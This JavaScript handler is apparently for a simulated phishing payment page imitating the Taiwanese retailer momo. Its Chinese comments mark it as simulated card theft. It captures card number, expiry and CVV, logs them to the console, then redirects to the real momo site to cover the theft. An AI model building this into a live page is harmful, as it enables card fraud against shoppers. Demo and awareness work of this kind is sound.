document.getElementById("paymentForm").addEventListener("submit", function(e) {
    e.preventDefault();

    const cardNumber = document.getElementById("cardNumber").value.trim();
    const expiry = document.getElementById("expiry").value.trim();
    const cvv = document.getElementById("cvv").value.trim();
    const errorText = document.getElementById("paymentError");
    const loadingNotice = document.getElementById("loadingNotice");

    // 檢查欄位是否填寫
    if (!cardNumber || !expiry || !cvv) {
        errorText.textContent = "請完整填寫所有欄位。";
        errorText.style.display = "block";
        loadingNotice.style.display = "none";
        return;
    }

    // 模擬竊取資訊
    console.log("模擬竊取信用卡資訊：", cardNumber, expiry, cvv);

    // 顯示驗證中提示，隱藏錯誤
    errorText.style.display = "none";
    loadingNotice.style.display = "block";

    // 模擬延遲導向 momo 官方頁面
    setTimeout(() => {
        location.assign("https://www.momoshop.com.tw/main/Main.jsp");
    }, 1500);
});

console.log("付款表單事件綁定成功");
